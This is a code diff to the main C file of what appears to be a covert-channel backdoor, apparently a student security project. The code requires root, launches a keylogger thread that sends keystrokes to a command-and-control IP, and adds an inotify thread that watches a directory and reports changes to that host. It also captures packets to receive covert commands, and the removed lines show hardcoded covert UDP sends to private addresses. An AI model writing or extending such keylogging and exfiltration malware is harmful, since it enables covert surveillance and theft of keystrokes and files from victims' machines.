@@ -1,4 +1,5 @@
 #include <getopt.h>
+#include <pthread.h>
 #include "../src/encrypt_utils.h"
 #include "../src/socketwrappers.h"
 #include "../src/covert_wrappers.h"
@@ -10,16 +11,15 @@ static void print_usage(void) {
     puts ("Usage options: \n"
             "\t--nic      -   network interface to use\n"
             "\t--target   -   target machine to attack\n"
-            //"\t--command  -   command to request from infected machine\n"
-            "\t--local  -   your local ip\n"
-            /*"\t--delay    -   delays between arp spoofs\n"*/);
+            "\t--local    -   your local ip\n"
+            "\t--tcp      -   use TCP protocol\n");
 }
 
 static struct option long_options[] = {
     {"nic",     required_argument,  0,  0 },
     {"target",  required_argument,  0,  1 },
-    {"local",    required_argument,  0,  2 },
-    //{"delay",   optional_argument,  0,  4 },
+    {"local",   required_argument,  0,  2 },
+    {"tcp",     optional_argument,  0,  3 },
     {0,         0,                  0,  0 }
 };
 
@@ -28,11 +28,13 @@ int main(int argc, char **argv){
     //change the UID/GID to 0 to raise privs
     //setuid(0);
     //setgid(0);
+    pthread_t inotify_thread;
     int arg;
     char cnc_ip[BUFSIZ];
     char local_ip[BUFSIZ];
     struct filter Filter;
     char pcapfilter[BUFSIZ];
+    bool tcp = false;
 
     if(geteuid() != 0) {
         printf("Must run as root\n");
@@ -61,6 +63,9 @@ int main(int argc, char **argv){
                 strncpy(local_ip, optarg, BUFSIZ);
                 printf("LOCAL IP: %s\n", local_ip);
                 break;
+            case 3:
+                tcp = true;
+                break;
             default: /*  '?' */
                 print_usage();
                 exit(1);
@@ -74,22 +79,21 @@ int main(int argc, char **argv){
     pthread_t keylogger_thread; //create a thread
     pthread_create(&keylogger_thread, NULL, keylogger_send, keylogger_args);
 
-    //commands (put on another thread?)
-    printf("%s\n",cnc_ip);
+    //create the inotify thread
+    inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
+    strncpy(inotify_args->targetip, cnc_ip, BUFSIZ);
+    strncpy(inotify_args->localip, local_ip, BUFSIZ);
+    inotify_args->tcp = tcp;
+    pthread_create(&inotify_thread, NULL, watch_directory,inotify_args);
+
+    //start capturing packets
     Filter = InitFilter(cnc_ip,local_ip, true);
-    PrintFilter(Filter);
-    CreateFilter(Filter, pcapfilter);
+    CreateFilter(Filter, pcapfilter,tcp);
     printf("Filter: %s\n",pcapfilter);
+    Packetcapture(pcapfilter,Filter,tcp);
 
-
-    /*
-    char *buf;
-    buf="ben";
-    covert_udp_send("192.168.0.118", "192.168.0.115", 8506, 8506, buf, 2);
-    covert_udp_send("192.168.0.118", "192.168.0.115", 8507, 8507, buf, 2);*/
-    Packetcapture(pcapfilter,Filter,true);
-
-    //wait for the keylogger thread to finish before exiting
     pthread_join(keylogger_thread, NULL);
+    pthread_join(inotify_thread, NULL);
+
     return 0;
 }
